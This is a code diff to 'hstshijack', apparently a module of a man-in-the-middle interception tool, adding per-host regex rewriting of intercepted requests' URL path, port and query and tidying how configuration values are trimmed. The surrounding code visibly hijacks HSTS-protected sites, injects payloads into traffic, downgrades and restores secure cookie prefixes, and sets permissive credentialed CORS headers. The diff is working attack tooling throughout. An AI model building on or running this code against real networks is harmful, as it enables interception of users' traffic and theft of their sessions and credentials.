@@ -35,10 +35,16 @@ var payloads = {},
 
 var replacements_req_body,
     replacements_req_headers,
+    replacements_req_url_path,
+    replacements_req_url_port,
+    replacements_req_url_query,
     replacements_res_body,
     replacements_res_headers,
     rx_target_hosts_replacements_req_body = [],
     rx_target_hosts_replacements_req_headers = [],
+    rx_target_hosts_replacements_req_url_path = [],
+    rx_target_hosts_replacements_req_url_port = [],
+    rx_target_hosts_replacements_req_url_query = [],
     rx_target_hosts_replacements_res_body_html = [],
     rx_target_hosts_replacements_res_body_javascript = [],
     rx_target_hosts_replacements_res_body_json = [],
@@ -457,22 +463,22 @@ function indexDomain(domain) {
 function configure() {
   /* Read caplet. */
   env["hstshijack.ignore"]
-    ? ignore_hosts = env["hstshijack.ignore"].replace(/\s/g, "").split(",")
+    ? ignore_hosts = env["hstshijack.ignore"].replace(/^\s*(.*?)\s*$/g, "$1").split(",")
     : ignore_hosts = [];
   env["hstshijack.targets"]
-    ? target_hosts = env["hstshijack.targets"].replace(/\s/g, "").split(",")
+    ? target_hosts = env["hstshijack.targets"].replace(/^\s*(.*?)\s*$/g, "$1").split(",")
     : target_hosts = [];
   env["hstshijack.replacements"]
-    ? replacement_hosts = env["hstshijack.replacements"].replace(/\s/g, "").split(",")
+    ? replacement_hosts = env["hstshijack.replacements"].replace(/^\s*(.*?)\s*$/g, "$1").split(",")
     : replacement_hosts = [];
   env["hstshijack.blockscripts"]
-    ? block_script_hosts = env["hstshijack.blockscripts"].replace(/\s/g, "").split(",")
+    ? block_script_hosts = env["hstshijack.blockscripts"].replace(/^\s*(.*?)\s*$/g, "$1").split(",")
     : block_script_hosts = [];
   env["hstshijack.obfuscate"]
-    ? obfuscate = env["hstshijack.obfuscate"].replace(/\s/g, "").toLowerCase() === "true" ? true : false
+    ? obfuscate = env["hstshijack.obfuscate"].replace(/^\s*(.*?)\s*$/g, "$1").toLowerCase() === "true" ? true : false
     : obfuscate = false;
   env["hstshijack.cookies.downgrade"]
-    ? downgrade_cookies = env["hstshijack.cookies.downgrade"].replace(/\s/g, "").toLowerCase() === "true" ? true : false
+    ? downgrade_cookies = env["hstshijack.cookies.downgrade"].replace(/^\s*(.*?)\s*$/g, "$1").toLowerCase() === "true" ? true : false
     : downgrade_cookies = false;
 
   /* Validate caplet. */
@@ -548,7 +554,7 @@ function configure() {
 
   /* Prepare response body regex replacements. */
   env["hstshijack.replacements.res.body"]
-    ? replacements_res_body_path = env["hstshijack.replacements.res.body"].replace(/\s/g, "")
+    ? replacements_res_body_path = env["hstshijack.replacements.res.body"].replace(/^\s*(.*?)\s*$/g, "$1")
     : replacements_res_body_path = "";
   try {
     replacements_res_body = JSON.parse(readFile(replacements_res_body_path));
@@ -615,10 +621,10 @@ function configure() {
 
   /* Prepare request headers regex replacements. */
   env["hstshijack.replacements.req.headers"]
-    ? replacements_req_headers_path = env["hstshijack.replacements.req.headers"].replace(/\s/g, "")
-    : replacements_req_headers_path = "";
+    ? replacements_req_headers_filepath = env["hstshijack.replacements.req.headers"].replace(/^\s*(.*?)\s*$/g, "$1")
+    : replacements_req_headers_filepath = "";
   try {
-    replacements_req_headers = JSON.parse(readFile(replacements_req_headers_path));
+    replacements_req_headers = JSON.parse(readFile(replacements_req_headers_filepath));
   } catch (err) {
     log_fatal(err);
   }
@@ -642,10 +648,10 @@ function configure() {
 
   /* Prepare request body regex replacements. */
   env["hstshijack.replacements.req.body"]
-    ? replacements_req_body_path = env["hstshijack.replacements.req.body"].replace(/\s/g, "")
-    : replacements_req_body_path = "";
+    ? replacements_req_body_filepath = env["hstshijack.replacements.req.body"].replace(/^\s*(.*?)\s*$/g, "$1")
+    : replacements_req_body_filepath = "";
   try {
-    replacements_req_body = JSON.parse(readFile(replacements_req_body_path));
+    replacements_req_body = JSON.parse(readFile(replacements_req_body_filepath));
   } catch (err) {
     log_fatal(err);
   }
@@ -667,9 +673,72 @@ function configure() {
     }
   }
 
+  /* Prepare request url regex replacements. */
+  env["hstshijack.replacements.req.url"]
+    ? replacements_req_url_filepath = env["hstshijack.replacements.req.url"].replace(/^\s*(.*?)\s*$/g, "$1")
+    : replacements_req_url_filepath = "";
+  try {
+    replacements_req_url_path = JSON.parse(readFile(replacements_req_url_filepath)).path;
+    replacements_req_url_port = JSON.parse(readFile(replacements_req_url_filepath)).port;
+    replacements_req_url_query = JSON.parse(readFile(replacements_req_url_filepath)).query;
+  } catch (err) {
+    log_fatal(err);
+  }
+  var host_selector_strings_req_url_path = Object.keys(replacements_req_url_path);
+  var host_selector_strings_req_url_port = Object.keys(replacements_req_url_port);
+  var host_selector_strings_req_url_query = Object.keys(replacements_req_url_query);
+  for (a = 0; a < host_selector_strings_req_url_path.length; a++) {
+    var selector_string = host_selector_strings_req_url_path[a];
+    if (selector_string === "*") {
+      rx_target_hosts_replacements_req_url_path.push(new RegExp(".*"));
+    } else {
+      rx_target_hosts_replacements_req_url_path.push(
+        toWholeRegexpSet(selector_string, "")[0]);
+    }
+    for (b = 0; b < replacements_req_url_path[selector_string].length; b++) {
+      var rx_set = replacements_req_url_path[selector_string][b];
+      replacements_req_url_path[selector_string][b] = [
+        new RegExp(rx_set[0], rx_set[1]),
+        rx_set[2],
+      ];
+    }
+  }
+  for (a = 0; a < host_selector_strings_req_url_port.length; a++) {
+    var selector_string = host_selector_strings_req_url_port[a];
+    if (selector_string === "*") {
+      rx_target_hosts_replacements_req_url_port.push(new RegExp(".*"));
+    } else {
+      rx_target_hosts_replacements_req_url_port.push(
+        toWholeRegexpSet(selector_string, "")[0]);
+    }
+    for (b = 0; b < replacements_req_url_port[selector_string].length; b++) {
+      var rx_set = replacements_req_url_port[selector_string][b];
+      replacements_req_url_port[selector_string][b] = [
+        new RegExp(rx_set[0], rx_set[1]),
+        rx_set[2],
+      ];
+    }
+  }
+  for (a = 0; a < host_selector_strings_req_url_query.length; a++) {
+    var selector_string = host_selector_strings_req_url_query[a];
+    if (selector_string === "*") {
+      rx_target_hosts_replacements_req_url_query.push(new RegExp(".*"));
+    } else {
+      rx_target_hosts_replacements_req_url_query.push(
+        toWholeRegexpSet(selector_string, "")[0]);
+    }
+    for (b = 0; b < replacements_req_url_query[selector_string].length; b++) {
+      var rx_set = replacements_req_url_query[selector_string][b];
+      replacements_req_url_query[selector_string][b] = [
+        new RegExp(rx_set[0], rx_set[1]),
+        rx_set[2],
+      ];
+    }
+  }
+
   /* Prepare payloads. */
   env["hstshijack.payloads"]
-    ? payload_entries = env["hstshijack.payloads"].replace(/\s/g, "").split(",")
+    ? payload_entries = env["hstshijack.payloads"].replace(/^\s*(.*?)\s*$/g, "$1").split(",")
     : payload_entries = [];
   for (a = 0; a < payload_entries.length; a++) {
     if (
@@ -788,7 +857,7 @@ function showConfig() {
   logStr += "    " + yellow + "      hstshijack.obfuscate" + reset + " > " + (obfuscate ? green + "true" : red + "false") + reset + "\n";
   logStr += "    " + yellow + "       hstshijack.payloads" + reset + " > ";
   if (env["hstshijack.payloads"]) {
-    list = env["hstshijack.payloads"].replace(/\s/g, "").split(",");
+    list = env["hstshijack.payloads"].replace(/^\s*(.*?)\s*$/g, "$1").split(",");
     logStr += green + list[0] + reset + "\n";
     if (list.length > 1) {
       for (a = 1; a < list.length; a++) {
@@ -1118,6 +1187,7 @@ function onRequest(req, res) {
       }
     } else { /* If requested domain is not indexed. */
 
+      // TODO
       // we can perform an SSL check synchronously with a set timeout, and/or we can
       // perform an SSL check asynchronously for future hijacking attempts
 
@@ -1164,13 +1234,36 @@ function onRequest(req, res) {
     });
 
     /* Execute regex URL replacements. */
+    Object.keys(replacements_req_url_path).forEach(function(selector_string, a) {
+      rx_target_hosts_replacements_req_url_path[a].lastIndex = 0;
+      if (rx_target_hosts_replacements_req_url_path[a].test(req.Hostname)) {
+        replacements_req_url_path[selector_string].forEach(function(rx_set) {
+          req.Path = req.Path.replace(rx_set[0], rx_set[1]);
+	});
+      }
+    });
+    Object.keys(replacements_req_url_port).forEach(function(selector_string, a) {
+      rx_target_hosts_replacements_req_url_port[a].lastIndex = 0;
+      if (rx_target_hosts_replacements_req_url_port[a].test(req.Hostname)) {
+        replacements_req_url_port[selector_string].forEach(function(rx_set) {
+          req.Port = req.Port.replace(rx_set[0], rx_set[1]);
+	});
+      }
+    });
+    Object.keys(replacements_req_url_query).forEach(function(selector_string, a) {
+      rx_target_hosts_replacements_req_url_query[a].lastIndex = 0;
+      if (rx_target_hosts_replacements_req_url_query[a].test(req.Hostname)) {
+        replacements_req_url_query[selector_string].forEach(function(rx_set) {
+          req.Query = req.Query.replace(rx_set[0], rx_set[1]);
+	});
+      }
+    });
 
     /* Restore cookies. */
     req.Headers = req.Headers
       .replace(rx_global_cookie_host_prefix, "__Host-")
       .replace(rx_global_cookie_secure_prefix, "__Secure-");
   }
-//if (req.Path.indexOf("error") !== -1) console.log(JSON.stringify(req, null, 4));
 }
 
 function onResponse(req, res) {
@@ -1455,9 +1548,6 @@ function onResponse(req, res) {
         }
       }
     }
-//    res.SetHeader("Content-Security-Policy", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src-elem * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
-//    res.SetHeader("X-WebKit-CSP", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src-elem * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
-//    res.SetHeader("X-Content-Security-Policy", "default-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; worker-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; script-src-elem * data: blob: filesystem: 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: filesystem: 'unsafe-inline'; img-src * data: blob: filesystem: 'unsafe-inline'; frame-src * data: blob: filesystem: 'unsafe-inline'; object-src * data: blob: filesystem: 'unsafe-inline'; style-src * data: blob: filesystem: 'unsafe-inline'; report-uri x");
     res.SetHeader("Access-Control-Allow-Credentials", "true");
     res.SetHeader("Access-Control-Allow-Origin", allowed_origin);
     res.SetHeader("Access-Control-Allow-Methods", "*");
